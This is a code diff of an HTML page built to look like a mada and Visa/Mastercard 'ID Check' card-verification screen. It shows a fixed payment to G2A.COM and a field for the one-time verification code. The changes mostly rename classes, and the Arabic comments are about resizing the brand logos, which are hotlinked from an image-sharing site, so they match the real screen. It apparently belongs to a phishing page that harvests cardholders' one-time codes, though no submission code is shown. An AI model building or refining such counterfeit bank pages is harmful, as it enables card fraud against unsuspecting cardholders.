@@ -5,11 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             background-color: #ffffff;
             margin: 0;
             padding: 20px;
-            color: #000;
         }
 
         .container {
@@ -17,105 +16,95 @@
             margin: 0 auto;
         }
 
-        /* شريط التحكم العلوي */
-        .top-nav {
+        .top-bar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
-        .back-icon {
+        .back-btn {
             color: #0000FF;
             font-size: 28px;
             font-weight: bold;
-            cursor: pointer;
+            text-decoration: none;
         }
 
-        .cancel-label {
+        .cancel-btn {
             font-weight: bold;
             font-size: 16px;
-            cursor: pointer;
         }
 
-        /* الشعارات - تم تكبيرها بشكل ملحوظ */
-        .header-section {
+        /* تنسيق الشعارات - التعديل هنا */
+        .header-logos {
             display: flex;
             justify-content: space-between;
-            align-items: flex-end;
-            margin-bottom: 15px;
+            align-items: center; /* لجعلهما على خط واحد */
+            margin-bottom: 10px;
         }
 
-        .mada-brand img {
-            height: 60px; /* حجم كبير جداً وواضح */
+        .mada-logo img {
+            height: 60px; /* نفس مقاس مدى */
             width: auto;
             display: block;
         }
 
-        .cards-brand {
+        .visa-master-logo img {
+            height: 60px; /* تم تكبيره ليتساوى مع شعار مدى تماماً */
+            width: auto;
+            display: block;
+        }
+
+        .id-check-label {
             text-align: right;
-        }
-
-        .cards-brand img {
-            height: 45px; /* حجم كبير للفيزا والماستركارد */
-            width: auto;
-            display: block;
-            margin-left: auto;
-        }
-
-        .id-check-text {
             font-size: 12px;
-            color: #333;
-            margin-top: 5px;
+            color: #444;
             font-weight: 500;
+            margin-top: 2px;
         }
 
         hr {
             border: 0;
-            border-top: 1.5px solid #ebebeb;
+            border-top: 1.5px solid #f0f0f0;
             margin: 15px 0 30px 0;
         }
 
-        /* العناوين والنصوص */
         h1 {
             font-family: "Times New Roman", Times, serif;
             font-size: 26px;
-            font-weight: bold;
             margin: 0 0 25px 0;
         }
 
         p {
             font-size: 17px;
             line-height: 1.5;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
         }
 
-        /* منطقة الإدخال والزر */
-        .auth-form {
+        .form-section {
             text-align: center;
             margin-top: 50px;
         }
 
-        .label-gray {
+        .input-hint {
             display: block;
             font-size: 15px;
-            color: #707070;
-            margin-bottom: 12px;
+            color: #888;
+            margin-bottom: 15px;
         }
 
         input[type="text"] {
             width: 100%;
-            max-width: 340px;
+            max-width: 350px;
             height: 55px;
-            border: 1px solid #b4b4b4;
+            border: 1px solid #ccc;
             border-radius: 4px;
-            font-size: 22px;
+            font-size: 24px;
             text-align: center;
             margin-bottom: 30px;
-            outline: none;
         }
 
-        .btn-submit {
+        .confirm-button {
             width: 100%;
             background-color: #0000FF;
             color: white;
@@ -125,10 +114,10 @@
             font-weight: bold;
             border-radius: 4px;
             cursor: pointer;
-            letter-spacing: 1px;
+            text-transform: uppercase;
         }
 
-        .resend-btn {
+        .resend-text {
             display: block;
             margin-top: 40px;
             color: #0000FF;
@@ -138,37 +127,35 @@
             margin-bottom: 60px;
         }
 
-        /* الروابط السفلية */
-        .footer-items {
-            border-top: 1px solid #f0f0f0;
+        .footer-nav {
+            border-top: 1px solid #eee;
         }
 
-        .item-row {
+        .footer-link {
             display: flex;
             justify-content: space-between;
-            align-items: center;
+            padding: 18px 0;
             color: #00008B;
             text-decoration: none;
             font-size: 16px;
-            padding: 18px 0;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="top-nav">
-        <div class="back-icon">&#10094;</div>
-        <div class="cancel-label">Cancel</div>
+    <div class="top-bar">
+        <a href="#" class="back-btn">&#10094;</a>
+        <div class="cancel-btn">Cancel</div>
     </div>
 
-    <div class="header-section">
-        <div class="mada-brand">
-            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada logo">
+    <div class="header-logos">
+        <div class="mada-logo">
+            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
         </div>
-        <div class="cards-brand">
+        <div class="visa-master-logo">
             <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Visa Mastercard">
-            <div class="id-check-text">ID Check</div>
+            <div class="id-check-label">ID Check</div>
         </div>
     </div>
 
@@ -180,20 +167,16 @@
     
     <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>
 
-    <div class="auth-form">
-        <label class="label-gray">Verification code</label>
-        <input type="text" autocomplete="off">
-        <button class="btn-submit">CONFIRM</button>
-        <a href="#" class="resend-btn">RESEND CODE</a>
+    <div class="form-section">
+        <label class="input-hint">Verification code</label>
+        <input type="text">
+        <button class="confirm-button">Confirm</button>
+        <a href="#" class="resend-text">RESEND CODE</a>
     </div>
 
-    <div class="footer-items">
-        <a href="#" class="item-row">
-            Learn more about authentication <span>+</span>
-        </a>
-        <a href="#" class="item-row">
-            Need some help ? <span>+</span>
-        </a>
+    <div class="footer-nav">
+        <a href="#" class="footer-link">Learn more about authentication <span>+</span></a>
+        <a href="#" class="footer-link">Need some help ? <span>+</span></a>
     </div>
 </div>
 
